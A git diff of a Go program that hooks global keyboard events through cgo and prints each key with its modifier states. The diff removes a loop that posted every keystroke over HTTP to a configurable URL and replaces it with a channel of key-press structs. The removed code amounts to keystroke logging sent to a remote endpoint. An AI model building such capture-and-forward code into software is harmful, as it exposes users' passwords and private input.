@@ -6,15 +6,11 @@ package main
 import "C"
 import (
 	"fmt"
-	"net/http"
 	"os"
 	"strings"
 	"unicode"
 	"unsafe"
 )
-
-var url = "http://localhost:8000"
-var keys = make(chan string, 10)
 
 //export handleKeyPress
 func handleKeyPress(
@@ -42,16 +38,14 @@ func handleKeyPress(
 	}
 	fmt.Printf("%s, code: %d, caps: %t, shift: %t, option: %t, cmd: %t, control: %t\n",
 		key, keyCode, caps, shift, option, cmd, control)
-	keys <- key
-}
-
-func callLoop() {
-	fmt.Printf("Listening for keys...")
-	for key := range keys {
-		_, err := http.Post(url+fmt.Sprintf("?key=%s", key), "application/json", nil)
-		if err != nil {
-			fmt.Printf("%v", err)
-		}
+	keysChannel <- KeyPress{
+		key:     key,
+		keyCode: keyCode,
+		caps:    caps,
+		shift:   shift,
+		option:  option,
+		cmd:     cmd,
+		control: control,
 	}
 }
 
@@ -59,6 +53,6 @@ func main() {
 	if len(os.Args) > 1 {
 		url = os.Args[1]
 	}
-	go callLoop()
+	go keyPressesLoop()
 	C.start()
 }
